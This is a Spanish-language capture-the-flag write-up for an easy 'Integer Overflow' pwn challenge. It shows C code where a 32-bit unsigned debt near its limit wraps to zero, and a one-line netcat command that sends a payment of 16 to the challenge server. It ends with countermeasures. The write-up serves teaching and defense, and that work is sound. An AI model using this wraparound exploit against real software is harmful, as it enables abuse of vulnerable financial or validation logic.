# Integer Overflow

| | |
|---|---|
| **Categoría** | Pwn |
| **Dificultad** | Fácil |
| **Puntos** | 100 |
| **Reto #** | 11 |
| **Conexión** | `nc chals.tropicalhunters.com 9007` |

## Descripción

El programa registra una deuda enorme (`0xFFFFFFF0`) y acepta pagos entre 0 y 100. La suma se realiza en 32 bits sin signo. El objetivo es hacer que el total dé la vuelta a cero.

## Análisis

```c
uint32_t debt    = 0xFFFFFFF0;  // 4294967280 — 16 unidades antes del límite
uint32_t payment;               // validado: 0 <= payment <= 100
uint32_t result  = debt + payment;

if (result <= 9)
    print_flag();
```

La deuda `0xFFFFFFF0` está exactamente **16 unidades** antes del límite de 32 bits. Cuando la suma supera `0xFFFFFFFF`, el carry se descarta y el resultado reinicia desde cero:

```
0xFFFFFFF0 + 16 = 0x100000000
              → truncado a 32 bits = 0x00000000  ✓
```

## Solución

Cualquier pago entre **16 y 25** produce `result` entre 0 y 9.

```bash
echo "16" | nc chals.tropicalhunters.com 9007
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- `uint32_t` desborda silenciosamente en C: `0xFFFFFFFF + 1 = 0`.
- Validar que un pago es "pequeño" (≤ 100) no evita el overflow si el acumulador ya está cerca del límite.
- Contramedida: verificar `debt + payment >= debt` antes de sumar, o usar aritmética saturada.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
